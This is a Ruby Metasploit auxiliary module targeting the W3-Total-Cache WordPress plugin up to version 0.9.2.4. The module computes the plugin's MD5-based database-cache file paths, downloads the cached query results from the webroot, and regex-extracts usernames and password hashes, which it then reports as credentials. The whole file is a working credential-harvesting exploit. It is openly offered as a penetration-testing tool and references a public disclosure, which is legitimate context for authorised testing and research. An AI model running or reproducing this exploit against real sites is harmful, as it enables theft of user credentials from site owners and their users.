##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#	 http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
				'Name'          => 'W3-Total-Cache Wordpress-plugin <= 0.9.2.4 Username and Hash Extract',
				'Description'   => %q{
					The W3-Total-Cache Wordpress Plugin can cache database statements and it's results in files for
					fast access.
					These files are in the webroot of the Wordpress installation and can be downloaded.
					This modules tries to find usernames and password hashes in these files.
					Version 0.9.2.4 has been fixed afterwards so it can be vulnerable.
				},
				'License'       => MSF_LICENSE,
				'References'    =>
						[
								[ 'URL', 'http://seclists.org/fulldisclosure/2012/Dec/242']
						],
				'Author'        =>
						[
								'Christian Mehlmauer <FireFart[at]gmail.com>',  # Metasploit module
								'Jason A. Donenfeld <Jason[at]zx2c4 com>'       # POC
						]
		)

		register_options(
				[
						OptString.new('URL', [ true,	'Wordpress root', '/']),
						OptString.new('TABLE_PREFIX', [ true,	'Wordpress table prefix', 'wp_']),
						OptInt.new('SITE_ITERATIONS', [ true, 'Number of sites to iterate', 25]),
						OptInt.new('USER_ITERATIONS', [ true, 'Number of users to iterate', 25]),
						OptString.new('WP_CONTENT_DIR', [ true,	'Wordpress content directory', 'wp-content'])
				], self.class)
	end

	def run_host(ip)

		users_found = false

		for site_id in 1..datastore["SITE_ITERATIONS"] do
			vprint_status("Trying site_id #{site_id}...")
			for user_id in 1..datastore["USER_ITERATIONS"] do
				vprint_status("Trying user_id #{user_id}...")
				query="SELECT * FROM #{datastore["TABLE_PREFIX"]}users WHERE ID = '#{user_id}'"
				query_md5 = ::Rex::Text.md5(query)
				host = datastore["VHOST"] || ip
				key="w3tc_#{host}_#{site_id}_sql_#{query_md5}"
				key_md5 = ::Rex::Text.md5(key)
				hash_path = "/#{key_md5[0,1]}/#{key_md5[1,1]}/#{key_md5[2,1]}/#{key_md5}"
				url="/#{datastore["URL"]}/#{datastore["WP_CONTENT_DIR"]}/w3tc/dbcache#{hash_path}"
				url = normalize_uri(url)

				result = nil
				begin
					result = send_request_cgi({ "uri" => url, "method" => "GET" })
				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					print_error("Unable to connect to #{url}")
					break
				rescue ::Timeout::Error, ::Errno::EPIPE
					print_error("Unable to connect to #{url}")
					break
				end

				if result.nil? or result.body.nil?
					print_error("No response received")
					break
				end

				match = result.body.scan(/.*"user_login";s:[0-9]+:"([^"]*)";s:[0-9]+:"user_pass";s:[0-9]+:"([^"]*)".*/)[0]
				unless match.nil?
					print_good("Username: #{match[0]}")
					print_good("Password Hash: #{match[1]}")
					report_auth_info(
							:host	 => rhost,
							:port	 => rport,
							:sname	=> ssl ? "https" : "http",
							:user	 => match[0],
							:pass	 => match[1],
							:active => true
					)
					users_found = true
				end
			end
		end
		print_error("No users found :(") unless users_found
	end
end
